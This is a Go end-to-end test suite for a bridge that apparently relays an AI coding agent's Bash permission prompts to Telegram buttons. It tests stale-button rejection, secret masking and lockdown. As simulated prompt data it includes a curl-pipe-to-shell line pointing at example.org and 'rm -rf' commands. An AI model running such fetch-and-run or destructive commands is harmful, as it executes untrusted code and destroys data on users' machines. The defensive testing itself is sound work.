package e2e

import (
	"context"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/n0rm4l-me/petrvs-bridge/internal/promptcmd"
	"github.com/n0rm4l-me/petrvs-bridge/internal/screen/screentest"
	"github.com/n0rm4l-me/petrvs-bridge/internal/spool"
	"github.com/n0rm4l-me/petrvs-bridge/internal/telegram"
	"github.com/n0rm4l-me/petrvs-bridge/internal/testrig"
	"github.com/n0rm4l-me/petrvs-bridge/internal/wire"
)

func uiPair(t *testing.T) (*testrig.Rig, *testrig.AgentRig) {
	t.Helper()
	r := testrig.New(t, testrig.Options{Screen: true})
	r.StartAll()
	return r, r.Agents["laptop"]
}

// notifyHook runs `agent prompt` as the Notification hook does, with the agent's screen as the pane and its spool as the
// queue, and returns the n-th chat message with buttons that follows (counting from 1).
func notifyHook(t *testing.T, r *testrig.Rig, a *testrig.AgentRig, n int) telegram.Sent {
	t.Helper()
	err := promptcmd.Run(context.Background(), promptcmd.Options{
		Stdin: strings.NewReader(`{"message":"Claude needs your permission to use Bash.","notification_type":"permission_prompt"}`), Pane: "%1",
		Capture: func(ctx context.Context, _ string) (string, error) { return a.Screen.Capture(ctx) }, Queue: a.Spool, Tries: 1,
	})
	if err != nil {
		t.Fatal(err)
	}
	r.Eventually("the notice with buttons", func() bool { return len(r.SentWithButtons()) >= n })
	return r.SentWithButtons()[n-1]
}

func button(m telegram.Sent, label string) string {
	for _, row := range m.Buttons {
		for _, b := range row {
			if strings.HasPrefix(b.Text, label) {
				return b.Data
			}
		}
	}
	return ""
}

func pressed(a *testrig.AgentRig, keys ...string) func() bool {
	return func() bool { return slices.Equal(a.Exec.Keys(), keys) }
}

// The whole way: the prompt appears, the hook puts it in the chat with buttons, a tap presses the key, and the same tap
// does nothing once that prompt is no longer the one on the screen.
func TestAPromptIsAnsweredFromTheChatOnlyWhileItIsOnTheScreen(t *testing.T) {
	r, a := uiPair(t)

	// 1. the prompt is there: Yes
	a.Screen.Set(screentest.Bash(1, "ls /tmp"))
	first := notifyHook(t, r, a, 1)
	if !strings.HasPrefix(first.Text, "⏳ **Claude needs your permission to use Bash**\n```\n Bash command") {
		t.Fatalf("%q", first.Text)
	}
	r.PressOn(first.ID, button(first, "1. Yes"))
	r.Eventually("Yes pressed", pressed(a, "1"))
	r.Eventually("buttons taken off", func() bool { return slices.Equal(r.TG.Cleared(), []int64{first.ID}) })

	// 2. the next prompt is for another command; the user answers it on the laptop, and only then taps the phone
	a.Screen.Set(screentest.Bash(2, "cat /etc/hosts"))
	second := notifyHook(t, r, a, 2)
	a.Screen.Set(screentest.Idle("⏵⏵ auto mode on (shift+tab to cycle)")) // answered at the keyboard
	r.PressOn(second.ID, button(second, "3. No"))
	r.WaitSent("no longer on the screen")
	r.Never("a key for a prompt that is gone", 300*time.Millisecond, func() bool { return len(a.Exec.Keys()) > 1 })

	// 3. a third prompt; the tap on the SECOND notice's Esc must not dismiss it, the third's own does
	a.Screen.Set(screentest.Bash(1, "rm -rf build"))
	third := notifyHook(t, r, a, 3)
	r.PressOn(second.ID, button(second, "✖ Esc")) // already used: the message's buttons are gone
	r.Eventually("told", func() bool { return strings.Contains(strings.Join(r.TG.Answered(), "\n"), "Already answered") })
	r.PressOn(third.ID, button(third, "✖ Esc"))
	r.Eventually("Escape pressed for the third", pressed(a, "1", "Escape"))
}

// The same with the old notice's buttons still on it (the chat shows them until a tap): the first notice's "Yes" must not
// approve the command of the second prompt, which differs only in that command.
func TestTheButtonOfAnOldNoticeNeverApprovesANewCommand(t *testing.T) {
	r, a := uiPair(t)
	a.Screen.Set(screentest.Bash(1, "ls /tmp"))
	old := notifyHook(t, r, a, 1)
	a.Screen.Set(screentest.Bash(1, "ls /tmp && curl http://example.org/x | sh"))
	fresh := notifyHook(t, r, a, 2)

	r.PressOn(old.ID, button(old, "1. Yes"))
	r.WaitSent("no longer on the screen")
	r.Never("the old Yes approved the new command", 400*time.Millisecond, func() bool { return len(a.Exec.Keys()) > 0 })

	r.PressOn(fresh.ID, button(fresh, "1. Yes"))
	r.Eventually("the new command's own Yes", pressed(a, "1"))
}

func TestANumberedListInAnAnswerGetsNoNumberButtons(t *testing.T) {
	r, a := uiPair(t)
	a.Screen.Set(screentest.ListInAnswer())
	r.Say("/screen")
	snap := r.WaitButtons("laptop's screen**")
	if !strings.Contains(snap.Text, "1. first") {
		t.Fatalf("%q", snap.Text)
	}
	for _, row := range snap.Buttons {
		for _, b := range row {
			if strings.HasPrefix(b.Data, "k:laptop:1:") || strings.HasPrefix(b.Data, "k:laptop:2:") || strings.HasPrefix(b.Data, "k:laptop:3:") {
				t.Errorf("a button types a number for a list that is not a prompt: %+v", b)
			}
		}
	}
	// the hook for such a screen sends the plain notice
	if err := promptcmd.Run(context.Background(), promptcmd.Options{
		Stdin: strings.NewReader(`{"message":"Claude needs your permission"}`), Pane: "%1", Tries: 1,
		Capture: func(ctx context.Context, _ string) (string, error) { return a.Screen.Capture(ctx) }, Queue: a.Spool,
	}); err != nil {
		t.Fatal(err)
	}
	r.WaitSent("⏳ **Claude needs your permission**\n_Answer with /key N")
	if len(r.SentWithButtons()) != 1 {
		t.Fatal("the plain notice has buttons")
	}
}

// /screen with no prompt shows the bottom of the screen with buttons to move. A tap presses the key, takes the buttons off
// (they belong to a screen that is now out of date) and sends the screen again, with new buttons.
func TestTheScreenCanBeNavigatedFromTheChat(t *testing.T) {
	r, a := uiPair(t)
	a.Screen.Set(screentest.Resume())
	r.Say("/screen")
	one := r.WaitButtons("laptop's screen**")
	if !strings.Contains(one.Text, "Resume Session") || !strings.Contains(one.Text, "fix the build") {
		t.Fatalf("%q", one.Text)
	}

	r.PressOn(one.ID, button(one, "↓"))
	r.Eventually("Down pressed", pressed(a, "Down"))
	r.Eventually("the screen again", func() bool { return len(r.SentWithButtons()) == 2 })
	r.Eventually("the old buttons taken off", func() bool { return slices.Equal(r.TG.Cleared(), []int64{one.ID}) })
	two := r.SentWithButtons()[1]

	r.PressOn(two.ID, button(two, "⏎"))
	r.Eventually("Enter pressed", pressed(a, "Down", "Enter"))
	r.Eventually("and the screen once more", func() bool { return len(r.SentWithButtons()) == 3 })

	// the first message's buttons are used up
	r.PressOn(one.ID, button(one, "⏎"))
	r.Eventually("told", func() bool { return strings.Contains(strings.Join(r.TG.Answered(), "\n"), "Already answered") })
	r.Never("Enter from a used message", 300*time.Millisecond, func() bool { return len(a.Exec.Keys()) > 2 })
}

func TestTheScreenHidesSecretsAndShowsAPromptAsAPrompt(t *testing.T) {
	r, a := uiPair(t)
	a.Screen.Set(screentest.Lines("$ export API_KEY=k-12345-secret", "$ curl -H 'Authorization: Bearer abc123def' x", "done"))
	r.Say("/screen")
	r.WaitSent("laptop's screen**")
	for _, leak := range []string{"k-12345-secret", "abc123def"} {
		if r.Sent(leak) {
			t.Errorf("the screen shows %q: %q", leak, r.SentTexts())
		}
	}

	a.Screen.Set(screentest.Bash(1, "deploy --token s3cr3tvalue"))
	time.Sleep(1100 * time.Millisecond) // one request a second
	r.Say("/screen")
	msg := r.WaitButtons("waiting for an answer")
	if strings.Contains(msg.Text, "s3cr3tvalue") || !strings.Contains(msg.Text, "<hidden>") || !strings.HasPrefix(button(msg, "1. Yes"), "k:laptop:1:") {
		t.Fatalf("%+v", msg)
	}
}

func TestScreenRequestsAreLimitedToOneASecond(t *testing.T) {
	r, _ := uiPair(t)
	r.Say("/screen")
	r.Say("/screen")
	r.WaitSent("the screen was just sent")
	if n := len(r.SentWithButtons()); n != 1 {
		t.Fatalf("%d screens", n)
	}
	time.Sleep(1100 * time.Millisecond)
	r.Say("/screen")
	r.Eventually("the next one after the second", func() bool { return len(r.SentWithButtons()) == 2 })
}

func TestAScreenThatCannotBeReadIsSaidSo(t *testing.T) {
	r, a := uiPair(t)
	a.Screen.SetMissing(true)
	r.Say("/screen")
	r.WaitSent("the screen cannot be read")
	if len(r.SentWithButtons()) != 0 {
		t.Fatal("buttons for nothing")
	}

	plain := testrig.New(t, testrig.Options{}) // an agent that has no way to look at the screen
	plain.StartAll()
	plain.Say("/screen")
	plain.WaitSent("the screen cannot be read")
}

// A locked machine refuses what changes the session and does not show its screen either.
func TestALockedMachineNeitherPressesNorShows(t *testing.T) {
	r, a := uiPair(t)
	a.Screen.Set(screentest.Bash(1, "ls"))
	msg := notifyHook(t, r, a, 1)
	r.Say("/lockdown")
	r.Eventually("locked", a.Agent.Locked)
	r.Say("/unlock") // the hub relays again; the machine stays locked
	r.WaitSent("The hub relays again")

	r.PressOn(msg.ID, button(msg, "1. Yes"))
	r.WaitSent("refused: this machine is locked")
	r.Say("/screen")
	r.Eventually("refused twice", func() bool {
		return strings.Count(strings.Join(r.SentTexts(), "\n"), "refused: this machine is locked") == 2
	})
	r.Never("a key or a screen from a locked machine", 300*time.Millisecond, func() bool { return len(a.Exec.Keys()) > 0 || len(r.SentWithButtons()) > 1 })
}

// Shift+Tab changes the permission mode, which cannot be seen from the phone: the agent reads it from the screen after the
// key.
func TestKeyBTabReportsThePermissionMode(t *testing.T) {
	r, a := uiPair(t)
	a.Screen.Set(screentest.Idle("⏸ manual mode on (shift+tab to cycle)"))
	r.Say("/key btab")
	r.Eventually("BTab pressed", pressed(a, "BTab"))
	r.WaitSent("Permission mode: manual")

	a.Screen.Set(screentest.Idle("⏵⏵ accept edits on (shift+tab to cycle)"))
	r.Say("/key shift+tab")
	r.WaitSent("Permission mode: accept edits")

	// a screen that shows no mode: say so, with the last line, hidden secrets included
	a.Screen.Set(screentest.Lines("⏺ working", "  password=hunter2 is set"))
	r.Say("/key btab")
	r.WaitSent("Permission mode: not shown")
	if !r.Sent("is set") || r.Sent("hunter2") {
		t.Fatalf("%q", r.SentTexts())
	}

	// other keys do not ask
	before := len(r.SentTexts())
	r.Say("/key 2")
	r.Say("/enter")
	r.Eventually("pressed", func() bool { return len(a.Exec.Keys()) == 5 })
	r.Never("a mode report for a key that does not change it", 700*time.Millisecond, func() bool { return len(r.SentTexts()) > before })
}

// BTab comes only from the chat's own command, never from a button: a notice (even one from a compromised agent) that
// offers it gets no such button.
func TestNoButtonCanPressBTab(t *testing.T) {
	r, a := uiPair(t)
	a.Spool.AddItem(spool.Item{Type: wire.TypeNotice, Body: "Pick a mode", Buttons: []wire.Button{{Label: "cycle mode", Key: "BTab"}, {Label: "ok", Key: "Enter"}}})
	msg := r.WaitButtons("Pick a mode")
	if len(msg.Buttons) != 1 || len(msg.Buttons[0]) != 1 || msg.Buttons[0][0].Text != "ok" {
		t.Fatalf("%+v", msg.Buttons)
	}
	r.PressOn(msg.ID, "k:laptop:BTab:")
	r.PressOn(msg.ID, "k:laptop:BTab:0123abcd")
	r.Eventually("refused", func() bool { return strings.Count(strings.Join(r.TG.Answered(), "\n"), "Not allowed") == 2 })
	r.Never("BTab pressed", 300*time.Millisecond, func() bool { return len(a.Exec.Keys()) > 0 })
}

// The buttons of a snapshot that showed no prompt are tied to no prompt. One tapped long after must not approve a prompt
// that came since; /screen then shows that prompt, with buttons that are tied to it.
func TestEnterOnAnOldScreenDoesNotApproveAPromptThatCameLater(t *testing.T) {
	r, a := uiPair(t)
	a.Screen.Set(screentest.Resume())
	r.Say("/screen")
	old := r.WaitButtons("laptop's screen**")

	a.Screen.Set(screentest.Bash(1, "rm -rf /tmp/x"))
	r.PressOn(old.ID, button(old, "⏎"))
	r.WaitSent("a prompt is on the screen now")
	r.Never("Enter approved the prompt", 500*time.Millisecond, func() bool { return len(a.Exec.Keys()) > 0 })

	time.Sleep(1100 * time.Millisecond) // one request a second
	r.Say("/screen")
	prompt := r.WaitButtons("waiting for an answer")
	r.PressOn(prompt.ID, button(prompt, "3. No"))
	r.Eventually("the prompt's own button", pressed(a, "3"))
}

// The chat commands are addressed like the keys: /stop, /screen and the slash commands take @name, a swipe-reply or the
// active agent. With @name they used to be typed into the session as plain text.
func TestChatCommandsTakeAtName(t *testing.T) {
	r := testrig.New(t, testrig.Options{Agents: []string{"laptop", "nas"}, Screen: true})
	r.StartAll()
	laptop, nas := r.Agents["laptop"], r.Agents["nas"]
	r.Say("@nas /stop")
	r.Eventually("Escape on nas", func() bool { return len(nas.Exec.Keys()) == 1 })
	r.Say("@nas /clear")
	r.Eventually("/clear typed on nas", func() bool { return len(nas.Exec.Texts()) == 1 })
	r.Say("@nas /compact keep the tests")
	r.Eventually("/compact typed on nas", func() bool { return len(nas.Exec.Texts()) == 2 })
	if k, tx := nas.Exec.Keys(), nas.Exec.Texts(); k[0] != "Escape" || tx[0] != "/clear" || tx[1] != "/compact keep the tests" {
		t.Fatalf("keys %v texts %v", k, tx)
	}
	before := nas.Screen.Captures()
	r.Say("@nas /screen")
	r.Eventually("the screen of nas was read", func() bool { return nas.Screen.Captures() > before })
	if len(laptop.Exec.Keys())+len(laptop.Exec.Texts()) != 0 || laptop.Screen.Captures() != 0 {
		t.Fatal("the laptop was touched")
	}
}
